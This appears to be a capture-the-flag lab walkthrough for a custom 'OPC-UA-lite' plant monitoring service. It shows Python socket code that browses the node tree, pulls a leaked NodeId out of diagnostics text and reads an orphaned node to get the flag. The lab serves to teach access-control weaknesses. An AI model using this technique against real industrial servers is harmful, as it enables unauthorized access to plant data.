# Challenge 3 — OPC Scout

**Protocol:** OPC-UA-lite (custom, non-standard) · **Port:** 9005 · **Toolkit module:** none — custom client required

---

## The Story

IT Ops flags that after the last reconfig of the plant monitoring server (server ident `Sysrupt-OPCUA/1.0`), a node was unlinked from the Objects tree — but it's still readable if you know its NodeId. The Diagnostics node under Server still references that orphaned NodeId. Despite the name, this is **not** a standards-compliant OPC UA server: it's an in-house "OPC-UA-lite" service on a non-standard port, so a normal UA client (UA Expert, python-opcua) will not complete a handshake with it. You'll need to speak its lite framing directly.

## What You Know

- Target: `10.0.1.1:9005`
- Not standards-compliant OPC UA — a normal `python-opcua` / UA Expert client will fail to handshake
- Browse from Root (`Objects` / `Server`) and check `Server` → `Diagnostics`
- The Diagnostics node still references the orphaned node's NodeId even though that node is unlinked from the Objects tree

## Step 1: Say hello and confirm the framing

<details>
<summary>Hint</summary>

Before browsing anything, the lite protocol expects a one-byte handshake. Send it and see what comes back before building out BROWSE/READ requests.

</details>

<details>
<summary>Show command</summary>

```python
import socket

HOST, PORT = "10.0.1.1", 9005
sock = socket.create_connection((HOST, PORT), timeout=5)

sock.sendall(b"\x01")          # HELLO
print("HELLO:", sock.recv(64))
```

</details>

## Step 2: Browse the Root node

<details>
<summary>Hint</summary>

Walk the node tree instead of guessing IDs. A BROWSE request is opcode `0x02` followed by a 2-byte big-endian NodeId. Root is NodeId `0x0000`. The response (`0x82`) carries a status byte, a child count, then repeated `(2-byte NodeId, 1-byte name length, name bytes)` entries — decode those to find the `Server` folder.

</details>

<details>
<summary>Show command</summary>

```python
def browse(sock, node_id):
    sock.sendall(bytes([0x02, (node_id >> 8) & 0xff, node_id & 0xff]))
    return sock.recv(1024)

def decode_browse(response):
    status, count = response[1], response[2]
    children, offset = [], 3
    for _ in range(count):
        node_id = (response[offset] << 8) | response[offset + 1]
        name_len = response[offset + 2]
        name = response[offset + 3:offset + 3 + name_len].decode("utf-8", "replace")
        children.append((node_id, name))
        offset += 3 + name_len
    return status, children

status, root_children = decode_browse(browse(sock, 0x0000))
print("ROOT children:", root_children)
```

</details>

## Step 3: Descend into Server → Diagnostics

<details>
<summary>Hint</summary>

Find the `Server` entry among Root's children and browse it the same way to find `Diagnostics`. Diagnostics is a readable value node, not a folder — once you have its NodeId you READ it rather than browse it.

</details>

<details>
<summary>Show command</summary>

```python
server_id = next(nid for nid, name in root_children if name == "Server")
status, server_children = decode_browse(browse(sock, server_id))
print("SERVER children:", server_children)

diag_id = next(nid for nid, name in server_children if name == "Diagnostics")
```

</details>

## Step 4: Read the Diagnostics text and extract the orphaned NodeId

<details>
<summary>Hint</summary>

A READ request is opcode `0x03` + the 2-byte NodeId. The response (`0x83`) carries a status byte, a length byte, then that many bytes of value. The Diagnostics text names the orphaned node directly — something like `WARN orphan node i=0x5000 unlinked from Objects` — so pull the NodeId straight out of that string.

</details>

<details>
<summary>Show command</summary>

```python
import re

def read(sock, node_id):
    sock.sendall(bytes([0x03, (node_id >> 8) & 0xff, node_id & 0xff]))
    return sock.recv(1024)

def decode_read(response):
    status, length = response[1], response[2]
    value = response[3:3 + length]
    return status, value

status, diag_value = decode_read(read(sock, diag_id))
diag_text = diag_value.decode("utf-8", "replace")
print("DIAGNOSTICS:", diag_text)

m = re.search(r"i=0x([0-9a-fA-F]+)", diag_text)
orphan_id = int(m.group(1), 16)
print(f"Orphaned NodeId: 0x{orphan_id:04x}")
```

</details>

## Step 5: Read the orphaned node directly

<details>
<summary>Hint</summary>

The node is unlinked from the Objects tree, so you'll never reach it by browsing — but READ doesn't care whether a node is linked anywhere, only that you know its NodeId. Read it directly.

</details>

<details>
<summary>Show command</summary>

```python
status, flag_value = decode_read(read(sock, orphan_id))
print("FLAG:", flag_value.decode("utf-8", "replace"))
```

</details>

## What You Learned

Not every node in an OPC-UA-style address space is reachable by browsing — a node can be unlinked ("orphaned") from the folder hierarchy while remaining fully readable if you already know its NodeId. Diagnostic/log text is a common place for an internal NodeId to leak, turning a routine reconfig mistake into a direct path to data that was never meant to be reachable from the public tree.
